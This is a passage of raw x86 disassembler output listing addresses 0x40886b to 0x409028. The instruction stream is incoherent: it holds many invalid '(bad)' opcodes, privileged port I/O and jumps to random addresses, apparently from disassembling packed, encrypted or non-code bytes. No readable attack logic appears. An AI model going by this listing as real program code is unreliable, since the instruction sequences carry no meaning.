  40886b:	imul   ebx,DWORD PTR [esi+eiz*8],0x5e
  40886f:	sub    eax,0x302d9209
  408874:	in     eax,0x6a
  408876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408877:	in     al,0x59
  408879:	sbb    al,BYTE PTR [eax]
  40887b:	push   edi
  40887c:	xchg   esp,edx
  40887e:	ins    BYTE PTR es:[edi],dx
  40887f:	mov    ecx,0x9510681e
  408884:	cmp    al,BYTE PTR [esi-0x78]
  408887:	fwait
  408888:	mov    dl,0x60
  40888a:	fcom   DWORD PTR [eax-0x67]
  40888d:	sti    
  40888e:	imul   esi,esi,0xd449d212
  408894:	ins    BYTE PTR es:[edi],dx
  408895:	ins    DWORD PTR es:[edi],dx
  408896:	jns    0x408853
  408898:	sbb    ch,dh
  40889a:	mov    dl,0x7f
  40889c:	xor    al,0x3c
  40889e:	cmp    dl,bh
  4088a0:	cmp    ch,BYTE PTR [ebx+edx*8+0x13ab21e3]
  4088a7:	and    BYTE PTR [ebx],ch
  4088a9:	or     BYTE PTR [ebp+0x73],dl
  4088ac:	fcomip st,st(0)
  4088ae:	adc    ebp,DWORD PTR [eax+0x10b98300]
  4088b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088b5:	and    eax,0x6a1942b0
  4088ba:	xor    al,0x52
  4088bc:	and    al,BYTE PTR [eax+ecx*2-0x7c]
  4088c0:	cmp    ebx,DWORD PTR [ebp+0x52]
  4088c3:	cmp    al,0x77
  4088c5:	dec    esp
  4088c6:	sbb    al,0xa9
  4088c8:	(bad)  [edx-0x7aaa05fa]
  4088ce:	sbb    bl,BYTE PTR [ebx+0x7809412e]
  4088d4:	xor    al,0x58
  4088d6:	div    DWORD PTR [edi+0x359d0ff5]
  4088dc:	ins    DWORD PTR es:[edi],dx
  4088dd:	shl    DWORD PTR [edi-0x5f],1
  4088e0:	loop   0x4088a3
  4088e2:	or     eax,0xea8ce7e2
  4088e7:	push   eax
  4088e8:	pop    ecx
  4088e9:	jge    0x408913
  4088eb:	inc    esi
  4088ec:	mov    esi,0xa053d16a
  4088f1:	xchg   ecx,eax
  4088f2:	jnp    0x408952
  4088f4:	push   0x9b3f4b64
  4088f9:	pop    ecx
  4088fa:	test   eax,0xad4d3349
  4088ff:	cs dec eax
  408901:	outs   dx,DWORD PTR ds:[esi]
  408902:	addr16 mov edx,0x20991f50
  408908:	mov    ah,BYTE PTR [ebp-0x71]
  40890b:	repnz fild WORD PTR [edx-0x23d985ce]
  408912:	and    ebx,ebp
  408914:	xchg   esp,eax
  408915:	mov    ebx,0x4bc3631c
  40891a:	dec    edx
  40891b:	xor    bl,BYTE PTR [ebx+0x265b9d85]
  408921:	in     al,0x74
  408923:	push   ss
  408924:	dec    edi
  408925:	cmp    DWORD PTR [esp+eiz*8+0x59],0x9ee466d
  40892d:	sbb    DWORD PTR [eax+0x76],edx
  408930:	fld    QWORD PTR [ebx]
  408932:	adc    edx,DWORD PTR [edx-0x75a261f7]
  408938:	rol    DWORD PTR [edi],0x7
  40893b:	jg     0x4089ab
  40893d:	loope  0x4088f4
  40893f:	xor    al,0x25
  408941:	xchg   ecx,eax
  408942:	aam    0x69
  408944:	scas   eax,DWORD PTR es:[edi]
  408945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408946:	sub    al,0x3e
  408948:	js     0x408945
  40894a:	and    edi,0x106f796f
  408950:	js     0x408908
  408952:	pop    esi
  408953:	jmp    0xa8e341c6
  408958:	sub    eax,0xd84d9322
  40895d:	(bad)  
  40895e:	in     eax,dx
  40895f:	xor    DWORD PTR [edx-0x5cb750e0],ebp
  408965:	pusha  
  408966:	push   ebx
  408967:	or     DWORD PTR [edx+0xb],ebx
  40896a:	fcmovb st,st(3)
  40896c:	(bad)  
  40896d:	push   ebx
  40896e:	and    DWORD PTR [edi-0x71],esi
  408971:	adc    eax,0xf489e75
  408976:	loopne 0x4089be
  408978:	pop    edx
  408979:	push   es
  40897a:	pop    es
  40897b:	hlt    
  40897c:	mov    esp,ds
  40897e:	adc    BYTE PTR [ebx],cl
  408980:	dec    eax
  408981:	je     0x4089ac
  408983:	mov    bl,0xe
  408985:	cli    
  408986:	xchg   ebp,eax
  408987:	pop    ds
  408988:	rol    edi,0xe4
  40898b:	cld    
  40898c:	fwait
  40898d:	mov    WORD PTR [edi-0x57],gs
  408990:	imul   ecx,DWORD PTR cs:[ecx],0x394a80ca
  408997:	mov    ebx,0x28d3525f
  40899c:	push   esp
  40899d:	mov    bh,0x23
  40899f:	sub    eax,0x6b9fc806
  4089a4:	mov    es,edi
  4089a6:	push   ebx
  4089a7:	sub    al,0x77
  4089a9:	or     dl,ah
  4089ab:	mov    ecx,0x75b93375
  4089b0:	mov    edi,0x10e18dd
  4089b5:	cdq    
  4089b6:	cmp    eax,DWORD PTR [edi+0x2e]
  4089b9:	lea    esp,[eax+0x34]
  4089bc:	test   al,0xb9
  4089be:	int    0x21
  4089c0:	daa    
  4089c1:	mov    ch,0x5
  4089c3:	mov    ds:0x54f3665a,eax
  4089c8:	jmp    0xf2182302
  4089cd:	jae    0x4089e0
  4089cf:	icebp  
  4089d0:	div    DWORD PTR [ecx+0x6c]
  4089d3:	cmp    ah,dh
  4089d5:	jno    0x40896c
  4089d7:	or     al,0xb4
  4089d9:	test   BYTE PTR [eax+0x5dda3a30],0xcd
  4089e0:	mov    DWORD PTR [edi-0x500d455a],esi
  4089e6:	and    eax,0xa0bc25bf
  4089eb:	(bad)  
  4089ec:	pop    eax
  4089ed:	call   0x4675:0x9792fc7a
  4089f4:	jecxz  0x4089d3
  4089f6:	dec    ecx
  4089f7:	mov    al,ds:0xaa322d02
  4089fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089fd:	push   eax
  4089fe:	dec    ecx
  4089ff:	test   DWORD PTR [edx+0x74],ebp
  408a02:	fucomip st,st(3)
  408a04:	ss sub eax,0x77f650c6
  408a0a:	add    DWORD PTR [ebx-0x75c96826],ebx
  408a10:	lods   eax,DWORD PTR ds:[esi]
  408a11:	mov    gs,ebp
  408a13:	daa    
  408a14:	add    al,0xda
  408a17:	outs   dx,DWORD PTR ds:[esi]
  408a18:	jnp    0x4089fb
  408a1a:	and    DWORD PTR ds:0x5ec8ea3e,edi
  408a20:	clc    
  408a21:	rcr    DWORD PTR [edi],1
  408a23:	in     al,0x88
  408a25:	xor    ch,BYTE PTR [edx-0x1b]
  408a28:	cmp    eax,0xdeb34c0a
  408a2d:	bound  edi,QWORD PTR [edx+0x34]
  408a30:	sub    edi,ecx
  408a32:	add    al,0xdf
  408a34:	xor    eax,DWORD PTR [eax-0x5b]
  408a37:	or     eax,0x4d6bc1cc
  408a3c:	xor    al,0x6b
  408a3e:	lds    edx,FWORD PTR [edx+0x8]
  408a41:	pop    edx
  408a42:	in     eax,0x5c
  408a44:	icebp  
  408a45:	inc    ecx
  408a46:	and    eax,0x9326f806
  408a4b:	cmp    DWORD PTR ds:0x4becbaac,eax
  408a52:	jle    0x408a8f
  408a54:	add    ah,BYTE PTR [edi+0x4a]
  408a57:	pop    eax
  408a58:	inc    esi
  408a59:	cli    
  408a5a:	out    0xb1,al
  408a5c:	aam    0xc5
  408a5e:	cmp    BYTE PTR [edx+edi*1-0xc7ad1ef],dl
  408a65:	jmp    0xa9fad925
  408a6a:	loopne 0x408a10
  408a6c:	add    edx,eax
  408a6e:	jl     0x408a0b
  408a70:	mov    bh,0xbc
  408a72:	mov    cl,0xbd
  408a74:	imul   esp,DWORD PTR [ecx-0xd86094e],0xffffffb1
  408a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a7c:	push   esp
  408a7d:	mov    bh,BYTE PTR [ecx]
  408a7f:	cmp    al,0xa7
  408a81:	out    dx,eax
  408a82:	std    
  408a83:	daa    
  408a84:	(bad)  
  408a85:	xor    dh,cl
  408a87:	adc    eax,0x384cd6d6
  408a8c:	push   ebp
  408a8d:	pcmpeqb mm2,mm1
  408a90:	jg     0x408a3a
  408a92:	and    eax,DWORD PTR [edx]
  408a94:	xchg   edi,eax
  408a95:	xor    eax,0x988ca142
  408a9a:	div    BYTE PTR [eax]
  408a9c:	push   0xab877417
  408aa1:	hlt    
  408aa2:	cmp    BYTE PTR [ecx-0x272cc426],dl
  408aa8:	call   0x2c5f:0x7098605f
  408aaf:	daa    
  408ab0:	sahf   
  408ab1:	bnd jno 0x408ac2
  408ab4:	cmp    DWORD PTR [ebp+0x2e],esp
  408ab7:	loopne 0x408b24
  408ab9:	cld    
  408aba:	xor    esp,DWORD PTR [eax-0x2e]
  408abd:	mov    bl,0xd9
  408abf:	pop    edx
  408ac0:	sub    BYTE PTR [esi+esi*2],bl
  408ac3:	add    BYTE PTR [eax-0x1b],dh
  408ac6:	or     esp,DWORD PTR [eax+0x419f1996]
  408acc:	(bad)  
  408ace:	ins    DWORD PTR es:[edi],dx
  408acf:	sbb    al,0xf4
  408ad1:	push   eax
  408ad2:	mov    ds:0x724e1091,al
  408ad7:	loope  0x408a8a
  408ad9:	(bad)  
  408ada:	or     eax,0x94f169a4
  408adf:	ds sbb al,dh
  408ae2:	repnz sbb DWORD PTR [edi+ebp*1+0x8eb083f],edi
  408aea:	vfnmsub213ss xmm7,xmm0,DWORD PTR [esi-0x2d375438]
  408af3:	pop    ds
  408af4:	fbld   TBYTE PTR [edx+ebp*2]
  408af7:	sbb    edx,DWORD PTR [eax+0x18]
  408afa:	lock icebp 
  408afc:	retf   0x88a
  408aff:	or     eax,0x6c803c07
  408b04:	xor    bh,dh
  408b06:	sbb    dl,al
  408b08:	lods   al,BYTE PTR ds:[esi]
  408b09:	mov    dl,0x1
  408b0b:	ins    DWORD PTR es:[edi],dx
  408b0c:	add    BYTE PTR [ebp-0x7a],ch
  408b0f:	add    DWORD PTR [edi],edi
  408b11:	addr16 mov al,ds:0x2589
  408b15:	ins    BYTE PTR es:[edi],dx
  408b16:	add    DWORD PTR [esi],edx
  408b18:	gs stos BYTE PTR es:[edi],al
  408b1a:	pop    ds
  408b1b:	jg     0x408acb
  408b1d:	jbe    0x408b8a
  408b1f:	mov    dl,0x94
  408b21:	test   DWORD PTR [eax-0x63],esi
  408b24:	sub    eax,0x37316ccd
  408b29:	repz dec edi
  408b2b:	pop    edi
  408b2c:	shl    DWORD PTR [ebp+0x3ce33877],1
  408b32:	fst    DWORD PTR [eax+0x51993069]
  408b38:	inc    ebx
  408b39:	mov    ds:0xf7c5fecf,al
  408b3e:	pop    es
  408b3f:	(bad)  
  408b40:	iret   
  408b41:	es mov esi,0x17050a4
  408b47:	add    cl,cl
  408b49:	pushf  
  408b4a:	jae    0x408b81
  408b4c:	cdq    
  408b4d:	clc    
  408b4e:	cmc    
  408b4f:	ja     0x408b54
  408b51:	rcr    DWORD PTR [ecx],1
  408b53:	dec    eax
  408b54:	cmp    al,ah
  408b56:	mov    al,0x21
  408b58:	mov    al,0x29
  408b5a:	mov    edi,0x39abed36
  408b5f:	xor    esi,DWORD PTR [ebx-0x4eb89772]
  408b65:	imul   ebx,DWORD PTR [edi],0x71ca8147
  408b6b:	or     edi,ecx
  408b6d:	lods   eax,DWORD PTR ds:[esi]
  408b6e:	push   eax
  408b6f:	sub    al,0xbe
  408b71:	stos   BYTE PTR es:[edi],al
  408b72:	adc    ah,dl
  408b74:	mov    ecx,0x18c02f22
  408b79:	scas   al,BYTE PTR es:[edi]
  408b7a:	or     dl,BYTE PTR [ecx+0x2bba9b6c]
  408b80:	mov    dl,0x78
  408b82:	push   edx
  408b83:	int3   
  408b84:	push   es
  408b85:	pop    edx
  408b86:	fidiv  DWORD PTR [esi]
  408b88:	mov    es,WORD PTR [ecx+0x4a4dc45e]
  408b8e:	pusha  
  408b8f:	fdiv   QWORD PTR [ebx+0x7d]
  408b92:	add    al,cl
  408b94:	xor    dl,BYTE PTR [edi]
  408b96:	sbb    al,0x16
  408b98:	std    
  408b99:	mov    bl,0x8c
  408b9b:	mov    ecx,0xc5a655a3
  408ba0:	nop
  408ba1:	inc    esp
  408ba2:	fnstenv [esp+ebp*2-0x7fa6f1cc]
  408ba9:	cmp    al,dl
  408bab:	ja     0x408bf2
  408bad:	mov    edx,0x698e8336
  408bb2:	push   ss
  408bb3:	xchg   ebp,eax
  408bb4:	inc    ebp
  408bb5:	sub    BYTE PTR [edx+0x4f],0x4f
  408bb9:	inc    ebx
  408bba:	cmc    
  408bbb:	xchg   esp,eax
  408bbc:	add    bl,BYTE PTR ds:0x1f3b3ad8
  408bc2:	jns    0x408b69
  408bc4:	push   es
  408bc5:	and    al,0xab
  408bc7:	or     ebp,DWORD PTR [ebp+0x38]
  408bca:	mov    esp,ebp
  408bcc:	jmp    0xc225eb71
  408bd1:	jno    0x408b6a
  408bd3:	mov    al,ds:0x60f914a1
  408bd8:	and    esi,DWORD PTR [edi+0x14eeea25]
  408bde:	adc    BYTE PTR [esi+0x4f4b53a9],cl
  408be4:	push   eax
  408be5:	push   cs
  408be6:	jp     0x408b69
  408be8:	xor    DWORD PTR [edx+0x14],eax
  408beb:	xor    BYTE PTR [eax+0x51],0xf0
  408bef:	out    0xa1,eax
  408bf1:	into   
  408bf2:	sub    eax,ebp
  408bf4:	push   eax
  408bf5:	mov    dh,0xa6
  408bf7:	je     0x408bcf
  408bf9:	dec    ebp
  408bfa:	mov    bl,0xe7
  408bfc:	cmp    al,BYTE PTR [ebx+edx*2-0x768c3f7f]
  408c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c04:	sbb    esi,ecx
  408c06:	pop    eax
  408c07:	cmc    
  408c08:	ins    BYTE PTR es:[edi],dx
  408c09:	pop    ss
  408c0a:	icebp  
  408c0b:	int3   
  408c0c:	cwde   
  408c0d:	ret    
  408c0e:	push   eax
  408c0f:	int    0xec
  408c11:	mov    dl,0xc0
  408c13:	call   0x1ec4aa81
  408c18:	int    0xb3
  408c1a:	sub    BYTE PTR [edx],0x9d
  408c1d:	outs   dx,DWORD PTR ds:[esi]
  408c1e:	and    BYTE PTR [ecx+0x46b65521],bh
  408c24:	repz mov bh,0x10
  408c27:	aad    0x88
  408c29:	je     0x408c44
  408c2b:	loopne 0x408c85
  408c2d:	stos   DWORD PTR es:[edi],eax
  408c2e:	mov    eax,0xb2f83e3e
  408c33:	mov    esi,0xae04ef00
  408c38:	add    ah,ch
  408c3a:	mov    BYTE PTR [ecx+0x1d],al
  408c3d:	pop    ebp
  408c3e:	sbb    eax,0xae1ca6bb
  408c43:	mov    ebx,0x686a4483
  408c48:	inc    edx
  408c49:	jmp    DWORD PTR [ebx+0x28]
  408c4c:	(bad)  
  408c4d:	dec    BYTE PTR [ecx+eiz*4+0x5f]
  408c51:	enter  0x7919,0x21
  408c55:	mov    al,0x9c
  408c57:	mov    dh,0x6f
  408c59:	dec    ebp
  408c5a:	inc    ebx
  408c5b:	inc    ecx
  408c5c:	or     eax,0x5606fd27
  408c61:	adc    eax,0x28547b08
  408c66:	into   
  408c67:	push   ebp
  408c68:	iret   
  408c69:	add    eax,0x79f4bde5
  408c6e:	(bad)  
  408c6f:	push   ebx
  408c70:	es data16 stc 
  408c73:	leave  
  408c74:	cmp    al,0x30
  408c76:	mov    ds:0x6110bc25,al
  408c7b:	push   ss
  408c7c:	mov    eax,ds:0x7dfa139d
  408c81:	jmp    0xa9f0db6d
  408c86:	jl     0x408c78
  408c88:	inc    ebp
  408c89:	pop    esi
  408c8a:	cmp    BYTE PTR [ecx+0x7a07207],0x5e
  408c91:	bound  ecx,QWORD PTR [edi-0x2b]
  408c94:	ss dec ebp
  408c96:	bound  edx,QWORD PTR [esi]
  408c98:	push   es
  408c99:	(bad)
  408c9c:	inc    eax
  408c9d:	mov    bh,0xc6
  408c9f:	inc    ecx
  408ca0:	pop    edx
  408ca1:	stos   DWORD PTR es:[edi],eax
  408ca2:	mov    edx,0x79e7afa9
  408ca7:	cmp    BYTE PTR [ebx],bl
  408ca9:	mov    al,0xf9
  408cab:	mov    esi,0xe7886452
  408cb0:	pop    esp
  408cb1:	add    DWORD PTR [esi+edi*1+0x15246469],0xffffffd4
  408cb9:	or     DWORD PTR ds:0xd88305ac,esi
  408cbf:	sub    BYTE PTR [ebp-0x5e],bh
  408cc2:	mov    dl,BYTE PTR [esi+eax*1-0x4e]
  408cc6:	loope  0x408cb3
  408cc8:	mov    bl,0x4b
  408cca:	jmp    0x3dd73328
  408ccf:	pushf  
  408cd0:	rep ins BYTE PTR es:[edi],dx
  408cd2:	xchg   edx,eax
  408cd3:	adc    DWORD PTR [ebp-0x30],ebp
  408cd6:	js     0x408c5f
  408cd8:	daa    
  408cd9:	in     eax,dx
  408cda:	pop    ss
  408cdb:	sub    DWORD PTR ds:0xabeb21a,edi
  408ce1:	pop    edi
  408ce2:	sar    DWORD PTR [eax-0x2688c61d],0xda
  408ce9:	sub    al,0x28
  408ceb:	mov    al,0x39
  408ced:	pop    ss
  408cee:	fiadd  WORD PTR [esi+eax*1+0x43d03ac8]
  408cf5:	das    
  408cf6:	ins    BYTE PTR es:[edi],dx
  408cf7:	xlat   BYTE PTR ds:[ebx]
  408cf8:	and    al,0x17
  408cfa:	mov    bl,0xa1
  408cfc:	or     al,0x7e
  408cfe:	int3   
  408cff:	sbb    BYTE PTR [edi],ah
  408d01:	mov    eax,0x50b7bb04
  408d06:	sub    eax,0x411a6d3d
  408d0b:	inc    edi
  408d0c:	cdq    
  408d0d:	sub    eax,0x5553d309
  408d12:	inc    esi
  408d13:	imul   DWORD PTR [eax-0x57]
  408d16:	pop    edi
  408d17:	adc    ebx,ebp
  408d19:	nop
  408d1a:	mov    eax,ds:0x851aa71d
  408d1f:	adc    esi,ebx
  408d21:	int3   
  408d22:	mov    edi,0x5d91bb7b
  408d27:	adc    edi,ebx
  408d29:	fild   QWORD PTR [edi+0x58]
  408d2c:	test   eax,0x7282ad75
  408d31:	or     BYTE PTR [edi+0x189f751a],dh
  408d37:	inc    ebx
  408d38:	add    al,0x31
  408d3a:	rcr    edx,1
  408d3c:	mov    bh,0xf5
  408d3e:	mov    dh,0x53
  408d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d41:	lods   eax,DWORD PTR ds:[esi]
  408d42:	not    bl
  408d44:	scas   al,BYTE PTR es:[edi]
  408d45:	xor    bh,BYTE PTR fs:[ecx+ebx*2]
  408d49:	cmp    ebx,DWORD PTR [ebp-0x25]
  408d4c:	push   eax
  408d4d:	ret    0x84a2
  408d50:	aaa    
  408d51:	mov    al,bh
  408d53:	xor    dl,BYTE PTR ds:0xb37039c8
  408d59:	inc    eax
  408d5a:	sbb    eax,0x6333f525
  408d5f:	mov    DWORD PTR [esi-0x6b9af3cb],edi
  408d65:	mov    dl,0xa
  408d67:	jmp    0x44f9f256
  408d6c:	and    dh,dl
  408d6e:	aam    0x99
  408d70:	adc    eax,0x66a0d7c2
  408d75:	icebp  
  408d76:	inc    edx
  408d77:	rcl    BYTE PTR [ecx-0x1832b253],cl
  408d7d:	and    bl,BYTE PTR [edi+0x1b]
  408d80:	stos   BYTE PTR es:[edi],al
  408d81:	mov    al,ds:0x5c34ecaf
  408d86:	call   0x36309e8f
  408d8b:	in     eax,dx
  408d8c:	cmp    esi,DWORD PTR ds:0x9dbac1b3
  408d92:	mov    eax,ds:0xb9a2be5a
  408d97:	xor    DWORD PTR [eax+eiz*1+0x3d],0xf9afe94a
  408d9f:	xchg   dl,bh
  408da1:	aad    0x96
  408da3:	xor    bl,BYTE PTR [esi+0x69]
  408da6:	mov    al,ds:0xb6ad662c
  408dab:	pop    esp
  408dac:	mov    bl,0xff
  408dae:	mov    BYTE PTR [edi+0x39],cl
  408db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408db2:	xchg   esp,eax
  408db3:	mov    ah,0xa
  408db5:	push   eax
  408db6:	adc    BYTE PTR [edi-0x169f3adc],dh
  408dbc:	in     eax,0x44
  408dbe:	stc    
  408dbf:	lock xchg edx,eax
  408dc1:	xchg   edi,eax
  408dc2:	neg    DWORD PTR [ebx]
  408dc4:	std    
  408dc5:	lods   eax,DWORD PTR ds:[esi]
  408dc6:	jne    0x408dc1
  408dc8:	mov    edi,eax
  408dca:	mov    ebp,0x1b0714bb
  408dcf:	cld    
  408dd0:	sahf   
  408dd1:	inc    esi
  408dd2:	sbb    BYTE PTR [ecx-0x46],cl
  408dd5:	cld    
  408dd6:	test   eax,0x1a9e3da
  408ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ddc:	mov    edx,?
  408dde:	hlt    
  408ddf:	mov    eax,0xec48d6f4
  408de4:	js     0x408e3f
  408de6:	inc    edx
  408de7:	sub    bl,al
  408de9:	std    
  408dea:	jl     0x408de5
  408dec:	mov    dx,ax
  408def:	pop    esi
  408df0:	sbb    BYTE PTR [ebx-0x63f93202],dh
  408df6:	fldcw  WORD PTR [ebx]
  408df8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408df9:	adc    eax,0x69bd5783
  408dfe:	mul    ebx
  408e00:	sbb    al,0xd2
  408e02:	push   ss
  408e03:	jp     0x408dab
  408e05:	push   esp
  408e06:	cdq    
  408e07:	dec    edx
  408e08:	mov    ds:0x64ce2c4e,eax
  408e0d:	inc    edi
  408e0e:	add    edi,DWORD PTR [esi]
  408e10:	in     eax,dx
  408e11:	je     0x408e1c
  408e13:	jae    0x408e88
  408e15:	sbb    dh,BYTE PTR [ebp+eiz*2-0x7d]
  408e19:	pop    ebp
  408e1a:	pop    edi
  408e1b:	mov    ds:0xa358fd73,al
  408e20:	(bad)  
  408e21:	jl     0x408db9
  408e23:	or     eax,0x5fc8cdd
  408e28:	push   edx
  408e29:	ss or  al,0xab
  408e2c:	push   edx
  408e2d:	lock adc al,0x90
  408e30:	cmp    al,0x3f
  408e32:	pop    ebx
  408e33:	stc    
  408e34:	sub    ebp,DWORD PTR [eax+0x8396836]
  408e3a:	fndisi(8087 only) 
  408e3c:	dec    eax
  408e3d:	int3   
  408e3e:	push   edi
  408e3f:	loope  0x408e92
  408e41:	mov    ebx,0x4a7e2c4d
  408e46:	adc    eax,0xc85f7d5
  408e4b:	std    
  408e4c:	sbb    ecx,DWORD PTR [ebx+0x136d8ca9]
  408e52:	ds (bad) 
  408e54:	cmp    BYTE PTR [ebx],ah
  408e56:	mov    es,WORD PTR [esi]
  408e58:	mov    al,0x80
  408e5a:	inc    esp
  408e5b:	push   0x3d
  408e5d:	and    ch,dh
  408e5f:	inc    ebx
  408e60:	aam    0x36
  408e62:	aad    0xbb
  408e64:	(bad)  
  408e65:	adc    DWORD PTR [edx],esp
  408e67:	and    DWORD PTR [ebx-0x17],eax
  408e6a:	outs   dx,BYTE PTR ds:[esi]
  408e6b:	add    ch,BYTE PTR [eax+0x15]
  408e6e:	pop    ecx
  408e6f:	xor    ch,ch
  408e71:	pop    edi
  408e72:	dec    esi
  408e73:	inc    ebp
  408e74:	test   DWORD PTR [esi-0x192ae35b],ebx
  408e7a:	nop
  408e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e7c:	aam    0xd0
  408e7e:	ss out 0xf5,al
  408e81:	scas   al,BYTE PTR es:[edi]
  408e82:	sbb    DWORD PTR [edi+0x63bdc402],eax
  408e88:	pushf  
  408e89:	sub    DWORD PTR [edx+0x4f8828e9],ebp
  408e8f:	sub    al,0x65
  408e91:	jmp    0x408f0b
  408e93:	sbb    ecx,DWORD PTR [eax-0x10]
  408e96:	loopne 0x408e69
  408e98:	mov    ds:0x706dc196,al
  408e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e9e:	pop    eax
  408e9f:	xchg   edx,eax
  408ea0:	in     al,0xe2
  408ea2:	dec    DWORD PTR [eax+0x66]
  408ea5:	sti    
  408ea6:	sti    
  408ea7:	cmp    eax,0xb284d4d7
  408eac:	inc    esi
  408ead:	mov    bh,0x48
  408eaf:	push   0x17
  408eb1:	test   BYTE PTR [ebp-0x76],0x50
  408eb5:	jle    0x408f1d
  408eb7:	or     BYTE PTR [ebx],ah
  408eb9:	rol    DWORD PTR [ecx-0x30ca32df],1
  408ebf:	push   es
  408ec0:	jns    0x408eb6
  408ec2:	and    BYTE PTR [edx-0x37],0xc8
  408ec6:	jae    0x408eec
  408ec8:	jns    0x408ef9
  408eca:	jns    0x408e57
  408ecc:	idiv   DWORD PTR [ecx]
  408ece:	div    BYTE PTR [edi+edi*1]
  408ed1:	xlat   BYTE PTR ds:[ebx]
  408ed2:	out    0x8f,al
  408ed4:	mov    edi,0x342363fb
  408ed9:	nop
  408eda:	pop    eax
  408edb:	adc    BYTE PTR [esi],bh
  408edd:	and    eax,0xc8a3221b
  408ee2:	outs   dx,BYTE PTR ds:[esi]
  408ee3:	mov    esp,DWORD PTR [esi]
  408ee5:	dec    ebp
  408ee6:	jle    0x408ebf
  408ee8:	cwde   
  408ee9:	mov    dl,0x9
  408eeb:	in     al,0x28
  408eed:	fs add DWORD PTR es:[edi+0x53],0xffffffde
  408ef3:	in     al,0xe
  408ef5:	aas    
  408ef6:	or     esp,DWORD PTR [ecx+0x39]
  408ef9:	or     BYTE PTR [ebx-0x62ab0be6],ah
  408eff:	adc    DWORD PTR [ecx],eax
  408f01:	jb     0x408e9d
  408f03:	sub    al,0xdb
  408f05:	iret   
  408f06:	cmc    
  408f07:	pop    es
  408f08:	test   DWORD PTR [esi],esi
  408f0a:	push   ebx
  408f0b:	xor    al,0x2e
  408f0d:	push   eax
  408f0e:	sahf   
  408f0f:	std    
  408f10:	and    DWORD PTR [eax],esi
  408f12:	dec    esp
  408f13:	cmp    BYTE PTR [ecx+0x21],bh
  408f16:	mov    al,ds:0xe13ed7c7
  408f1b:	push   ebx
  408f1c:	test   bl,dh
  408f1e:	and    DWORD PTR [ebx],ebp
  408f20:	mov    BYTE PTR [ebx-0x3f],dl
  408f23:	mov    esp,0xe7dc82ec
  408f28:	loope  0x408f6e
  408f2a:	adc    al,0x71
  408f2c:	inc    edx
  408f2d:	into   
  408f2e:	outs   dx,BYTE PTR ds:[esi]
  408f2f:	or     esp,DWORD PTR [esi]
  408f31:	inc    ecx
  408f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f33:	mov    ch,0xf1
  408f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f37:	sub    BYTE PTR [eax-0xc],ch
  408f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f3b:	aaa    
  408f3c:	shr    BYTE PTR [eax],0xf2
  408f3f:	sbb    eax,0xece59e85
  408f44:	mov    ds:0x280d7785,eax
  408f49:	mov    ebp,0xf689a559
  408f4e:	jp     0x408f26
  408f50:	and    BYTE PTR [eax-0x5b96e07f],bh
  408f56:	and    al,0xda
  408f58:	les    esi,FWORD PTR [edi]
  408f5a:	mov    gs,WORD PTR [esi+ebx*8-0x17714a69]
  408f61:	xor    esi,0x3e
  408f64:	rcr    DWORD PTR fs:[ebx+0x10],0x2
  408f69:	inc    edx
  408f6a:	sti    
  408f6b:	sbb    bl,ah
  408f6d:	sbb    BYTE PTR [ebp+0x2b],bh
  408f70:	adc    DWORD PTR [eax-0x3921154b],0x79
  408f77:	adc    al,0x6f
  408f79:	xor    al,0x29
  408f7b:	in     eax,dx
  408f7c:	aad    0x64
  408f7e:	pop    ss
  408f7f:	push   esi
  408f80:	test   DWORD PTR [esi+edi*2+0x6b],esi
  408f84:	mov    bh,0x42
  408f87:	cs adc al,ch
  408f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f8b:	hlt    
  408f8c:	mov    DWORD PTR fs:[ecx-0x5725a677],esp
  408f93:	or     eax,0xf9d374e8
  408f98:	and    esi,DWORD PTR ds:0x62359311
  408f9e:	add    eax,esi
  408fa0:	call   0x18ef5865
  408fa5:	sub    bh,dl
  408fa7:	mov    edx,0xeef55c49
  408fac:	lock imul ebx,DWORD PTR [ebx-0x6c],0x28c57d60
  408fb4:	xchg   ecx,eax
  408fb5:	cwde   
  408fb6:	mov    ebp,DWORD PTR [ebp-0x544c553c]
  408fbc:	enter  0x411b,0x54
  408fc0:	ficomp WORD PTR [edi]
  408fc2:	pop    ds
  408fc3:	stos   DWORD PTR es:[edi],eax
  408fc4:	inc    ebx
  408fc5:	sbb    eax,0x3d1966d1
  408fca:	clc    
  408fcb:	and    DWORD PTR [ebx+0x451d7ce3],ebp
  408fd1:	mov    ebp,0x23a7f08a
  408fd6:	je     0x408f5e
  408fd8:	xchg   ecx,eax
  408fd9:	aam    0xcf
  408fdb:	and    bh,0x4
  408fde:	mov    cl,0x28
  408fe0:	pop    edi
  408fe1:	jnp    0x408fea
  408fe3:	das    
  408fe4:	stos   BYTE PTR es:[edi],al
  408fe5:	add    BYTE PTR [ebx-0x298a756c],cl
  408feb:	in     eax,0x96
  408fed:	dec    edx
  408fee:	push   ss
  408fef:	cmp    BYTE PTR [edi+0x45c83192],cl
  408ff5:	cmp    BYTE PTR [ecx+0x50a14b],bl
  408ffb:	int    0xee
  408ffd:	inc    esp
  408ffe:	(bad)  
  408fff:	sti    
  409000:	push   es
  409001:	das    
  409002:	sbb    al,0x3
  409004:	cmp    DWORD PTR [ebp+0x38],edx
  409007:	daa    
  409008:	mov    dl,0xe5
  40900a:	test   BYTE PTR [edi-0x11],dh
  40900d:	les    edx,FWORD PTR [edx-0x7663d0b3]
  409013:	or     ah,BYTE PTR [esi]
  409015:	mov    DWORD PTR [esi],esi
  409017:	hlt    
  409018:	cs ss out 0xd1,eax
  40901c:	jl     0x408feb
  40901e:	mov    ebx,0x7b73b1d2
  409023:	retf   
  409024:	xchg   esi,eax
  409025:	(bad)  
  409027:	pop    ds
  409028:	and    bl,0xc9
